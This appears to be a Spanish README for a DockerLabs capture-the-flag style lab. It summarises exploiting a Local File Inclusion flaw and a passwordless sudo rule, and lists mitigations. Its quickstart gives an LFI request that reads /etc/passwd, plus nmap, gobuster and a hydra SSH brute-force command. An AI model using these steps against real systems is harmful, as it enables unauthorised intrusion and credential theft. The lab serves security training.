# Análisis de Vulnerabilidad: Local File Inclusion (LFI)

**Descripción:** Laboratorio educativo (DockerLabs) que demuestra la explotación de una vulnerabilidad de inclusión local de archivos (LFI) y la escalada de privilegios posterior.

---

## 🚀 Inicio Rápido

Pasos clave (basados en `quickstart.md`):

1. Escaneo rápido: `nmap -sC -sV -p- -oA nmap_scan <objetivo>`  
2. Enumerar directorios web: `gobuster dir -u http://<objetivo>/ -w /path/to/wordlist.txt -t 50 -o gobuster.txt`  
3. Probar inclusión de `/etc/passwd`: `http://<objetivo>/shop?archivo=/etc/passwd`  
4. Si se obtienen credenciales, fuerza bruta SSH con `hydra -l <usuario> -P rockyou.txt ssh://<objetivo> -t 4 -f`  
5. Revisar `sudo -l` e inspeccionar reglas que permitan ejecución sin contraseña.

## 📚 Documentación

- `Inclusion.md` — Informe técnico completo en español (mejorado, estructura: Introducción, Metodología, Hallazgos, Conclusión, Mitigación).
- `InclusionEn.md` — Technical report in English (professional translation, same structure).
- `quickstart.md` — QuickStart guide (ES / EN), ultra-concise.

---

## 📁 Estructura del proyecto

- `Inclusion.md` — Informe técnico (ES)
- `InclusionEn.md` — Informe técnico (EN)
- `quickstart.md` — Guía rápida (ES/EN)
- `Img/` — Capturas y recursos visuales

---

## 🔍 Resumen de hallazgos y mitigación (rápido)

- Hallazgo: LFI expone archivos sensibles (impacto: alto).  
- Hallazgo: Reglas `sudo` permitiendo intérpretes sin contraseña (impacto: crítico).  

Mitigación: Validación de entradas, eliminar inclusiones dinámicas, auditar y restringir `sudo`, rotar credenciales y monitorizar accesos.

---

## 🤝 Contribución

Abra issues o PRs con correcciones o ampliaciones; documente banderas/commands exactos si los tiene.

---

**Aviso:** Mantener información sensible únicamente en entornos controlados.
